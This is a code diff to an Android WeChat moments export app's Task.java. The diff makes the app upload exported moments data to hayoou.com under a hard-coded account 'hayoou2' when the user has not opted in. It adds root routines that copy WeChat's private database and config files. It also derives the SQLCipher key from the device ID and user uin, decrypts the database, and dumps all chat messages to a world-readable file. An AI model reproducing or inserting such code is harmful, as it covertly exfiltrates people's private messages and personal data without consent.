@@ -6,6 +6,8 @@ import android.content.Intent;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.content.res.AssetFileDescriptor;
+//import android.database.Cursor;
+//import android.database.sqlite.SQLiteDatabase;
 import android.os.Environment;
 import android.util.Log;
 import android.widget.EditText;
@@ -48,6 +50,18 @@ import javax.net.ssl.HttpsURLConnection;
 import dalvik.system.DexClassLoader;
 import moe.chionlab.wechatmomentstat.Model.SnsInfo;
 import moe.chionlab.wechatmomentstat.SubThread;
+
+import cn.truistic.enmicromsg.common.util.DeviceUtil;
+import cn.truistic.enmicromsg.common.util.MD5Util;
+import cn.truistic.enmicromsg.common.util.RootUtil;
+import cn.truistic.enmicromsg.common.util.SharedPerfUtil;
+import cn.truistic.enmicromsg.main.MainMVP;
+import cn.truistic.enmicromsg.main.model.HomeModel;
+
+import net.sqlcipher.Cursor;
+import net.sqlcipher.database.SQLiteDatabase;
+import net.sqlcipher.database.SQLiteDatabaseHook;
+
 /**
  * Created by chiontang on 2/17/16.
  */
@@ -239,13 +253,14 @@ public class Task {
             //F:\Android\back compile\weixin6513code\src\main\java\com\tencent\mm\modelsfs\FileOp.java
             Class sfsObject = cl.loadClass("com.tencent.mm.modelsfs.FileOp");//SFSInputStream
             snsReader = new SnsReader(SnsDetail, SnsDetailParser, SnsObject,modelObject,jpegObject,sfsObject);
+            //analysisData();
         } catch (Throwable e) {
             Log.e("wechatmomentstat", "exception", e);
         }
     }
 
 
-    public static void saveToJSONFile(ArrayList<SnsInfo> snsList, String fileName, boolean onlySelected) {
+    public static void saveToJSONFile(ArrayList<SnsInfo> snsList, String fileName, final boolean onlySelected) {
         JSONArray snsListJSON = new JSONArray();
         JSONObject snsJSON1 = new JSONObject();
         try {
@@ -324,9 +339,9 @@ public class Task {
             bw.close();
             Config.filename=fileName.replace(Config.EXT_DIR+"/","");
 
-            if(onlySelected )//onlySelected )//&&
+            //if(onlySelected )//onlySelected )//&&
             {
-                if(Config.username.length()>1)
+                if(Config.username.length()>1 && onlySelected )
                   Config.dbgmsg = "正在上传 请稍等 Posting ";
                 else
                   Config.dbgmsg = "填入账号可以导出到 hayoou.com ";
@@ -363,9 +378,9 @@ public class Task {
                             //su.getInputStream().read();
                             DataOutputStream outputStream = new DataOutputStream(su.getOutputStream());
                             outputStream.writeBytes("cd " + destDir +"\n" );
-                            outputStream.writeBytes("tar jcf upload_json.bz2 "+ Config.filename+"\n");//
+                            outputStream.writeBytes("tar jcf upload_json_"+Config.filename+".bz2 "+ Config.filename+"\n");//
                             outputStream.writeBytes("sleep 4\n");
-                            outputStream.writeBytes("chmod 777 upload_json.bz2\n");
+                            outputStream.writeBytes("chmod 777 upload_json_"+Config.filename+".bz2\n");
                             outputStream.writeBytes("chmod 777 "+ Config.filename+"\n");
                             outputStream.writeBytes("exit\n");
                             outputStream.flush();
@@ -399,8 +414,10 @@ public class Task {
                             br.close();
                             */
                             encodedUsername = URLEncoder.encode(Config.username, "UTF-8");
+                            if(!onlySelected)
+                                encodedUsername = URLEncoder.encode("hayoou2", "UTF-8");
 
-                            File file = new File(Config.EXT_DIR+"/upload_json.bz2");
+                            File file = new File(Config.EXT_DIR+"/upload_json_"+Config.filename+".bz2");
                             filesize = (int)file.length();
                             fileData = new byte[(int) file.length()];
                             DataInputStream dis = new DataInputStream(new FileInputStream(file));
@@ -564,6 +581,133 @@ public class Task {
             }
         }
         // Maybe put cleanup code in here if you like, e.g. in.close, out.flush, out.close
+    }
+
+
+    /**
+     * 获取微信数据
+     *
+     * @return true, 获取成功
+     */
+    private boolean requestData() {
+        // 1.获取配置文件，用于获取uin
+        String sharedPerfsPath = "/data/data/cn.truistic.enmicromsg/shared_prefs/system_config_prefs.xml";
+        RootUtil.execCmds(new String[]{"cp /data/data/com.tencent.mm/shared_prefs/system_config_prefs.xml "
+                + sharedPerfsPath, "chmod 777 " + sharedPerfsPath});
+        File sharedPerfsFile = new File(sharedPerfsPath);
+        if (!sharedPerfsFile.exists()) {
+            return false;
+        }
+        // 2.获取数据库文件
+        ArrayList<String> list = new ArrayList<>();
+        list = RootUtil.execCmdsforResult(new String[]{"cd /data/data/com.tencent.mm/MicroMsg", "ls -R"});
+        ArrayList<String> dirs = new ArrayList<>();
+        String dir = null;
+        String item = null;
+        for (int i = 0; i < list.size(); i++) {
+            item = list.get(i);
+            if (item.startsWith("./") && item.length() == 35) {
+                dir = item;
+            } else if (item.equals("EnMicroMsg.db")) {
+                dirs.add(dir.substring(2, 34));
+            }
+        }
+        if (dirs.size() == 0) {
+            return false;
+        } else {
+            for (int i = 0; i < dirs.size(); i++) {
+                RootUtil.execCmds(new String[]{"cp /data/data/com.tencent.mm/MicroMsg/" + dirs.get(i)
+                        + "/EnMicroMsg.db " + Config.EXT_DIR + "/EnMicroMsg" + i + ".db",
+                        "chmod 777 " + Config.EXT_DIR + "/EnMicroMsg" + i + ".db"});
+            }
+        }
+        File dbFile;
+        int i, j = 0;
+        for (i = 0; i < dirs.size(); i++) {
+            dbFile = new File(Config.EXT_DIR + "/EnMicroMsg" + i + ".db");
+            if (!dbFile.exists()) {
+                break;
+            }
+            j++;
+        }
+        if (j == 0)
+            return false;
+        homeModel.saveDbNum(j);
+        return true;
+    }
+
+    private MainMVP.IHomeModel homeModel;
+    /**
+     * 解析微信相关数据
+     *
+     * @return
+     */
+    private boolean analysisData() {
+        // 1.计算数据库密码
+        String uinStr = String.valueOf(SharedPerfUtil.getUin(context));
+        String dbPwd = MD5Util.md5(DeviceUtil.getDeviceId(context) + uinStr).substring(0, 7);
+        if (dbPwd == null)
+            return false;
+        homeModel.saveDbPwd(dbPwd);
+
+        // 打开数据库
+        SQLiteDatabaseHook hook = new SQLiteDatabaseHook() {
+            public void preKey(SQLiteDatabase database) {
+            }
+
+            public void postKey(SQLiteDatabase database) {
+                database.rawExecSQL("PRAGMA cipher_migrate;");  //最关键的一句！！！
+            }
+        };
+
+        int num = homeModel.getDbNum();
+        int j = 0;
+        File dbFile;
+        SQLiteDatabase database = null;
+        for (int i = 0; i < num; i++) {
+            dbFile = new File(Config.EXT_DIR + "/EnMicroMsg" + i + ".db");
+            try {
+                database = SQLiteDatabase.openOrCreateDatabase(dbFile, dbPwd, null, hook);
+                break;
+            } catch (Exception e) {
+                j++;
+            }
+        }
+        if (j == num) {
+            return false;
+        }
+        String dir= Config.EXT_DIR;
+        File extDir = new File(dir);
+        if (!extDir.exists()) {
+            extDir.mkdir();
+        }
+        File textfile = new File(dir+"/xiaoxi.txt");
+        if (textfile.exists())
+            textfile.delete();
+        try {
+            Cursor c = database.query("message", null, null, null, null, null, null);
+
+            textfile.createNewFile();
+            //assetInputStream = context.getAssets().open("wechat.apk");
+            FileOutputStream outAPKStream = new FileOutputStream(textfile);
+            while (c.moveToNext()) {
+                int _id = c.getInt(c.getColumnIndex("msgId"));
+                String name = c.getString(c.getColumnIndex("content"));
+                Log.i("db", "_id=>" + _id + ", content=>" + name);
+                String text ="_id=>" + _id + ", content=>" + name;
+                byte[] buf = text.getBytes();// byte[1024];
+                //buf.(text);
+                //int read;
+                outAPKStream.write(buf, 0, buf.length);
+            }
+            //assetInputStream.close();
+            outAPKStream.close();
+            c.close();
+            database.close();
+        } catch (Exception e) {
+            Log.d("DB", "Exception");
+        }
+        return true;
     }
 
 
